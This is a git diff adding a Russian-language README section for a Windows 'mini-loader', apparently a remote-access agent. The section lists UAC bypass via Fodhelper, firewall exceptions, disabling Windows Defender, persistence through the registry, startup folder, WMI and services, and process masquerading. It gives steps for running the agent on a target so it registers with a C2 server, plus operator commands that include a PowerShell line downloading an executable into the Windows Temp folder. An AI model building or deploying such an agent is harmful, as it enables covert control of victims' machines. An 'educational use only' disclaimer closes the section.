@@ -186,4 +186,43 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Mr. Thomas Anderson (iamtomasanderson@gmail.com)
 
-GitHub: [Personaz1](https://github.com/Personaz1/) 
+GitHub: [Personaz1](https://github.com/Personaz1/)
+
+## Windows Mini-Loader
+
+Для выполнения команд на Windows системах, был создан специальный мини-лоадер, который обходит встроенные защитные механизмы Windows и предоставляет удаленный доступ к системе.
+
+### Возможности Windows-агента
+
+- Обход UAC для получения прав администратора (Fodhelper bypass)
+- Добавление исключений в брандмауэр Windows
+- Отключение/обход Windows Defender
+- Множественные методы персистентности:
+  - Реестр (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
+  - Папка автозагрузки
+  - WMI (Windows Management Instrumentation)
+  - Служба Windows
+- Скрытый режим работы
+- Маскировка процесса
+- Выполнение команд через PowerShell
+
+### Использование
+
+1. Скопируйте файл `win_agent_loader.py` на целевую Windows систему
+2. Запустите скрипт: `python win_agent_loader.py`
+3. Агент автоматически зарегистрируется на C2 сервере
+4. Отправляйте команды из интерфейса чата с префиксом `!`
+
+### Примеры команд
+
+```
+!whoami                                 # Отображает текущего пользователя
+!systeminfo                            # Информация о системе Windows
+!netstat -ano                          # Показать сетевые соединения
+!powershell Get-Process                # Выполнить PowerShell команду
+!powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://example.com/file.exe', 'C:\Windows\Temp\file.exe')"  # Загрузить файл
+```
+
+### Безопасность
+
+Мини-лоадер содержит потенциально опасный код и должен использоваться ТОЛЬКО в учебных целях и только на системах, для которых у вас есть законное разрешение на тестирование. Использование этого инструмента без соответствующего разрешения может нарушать законы о компьютерной безопасности. 
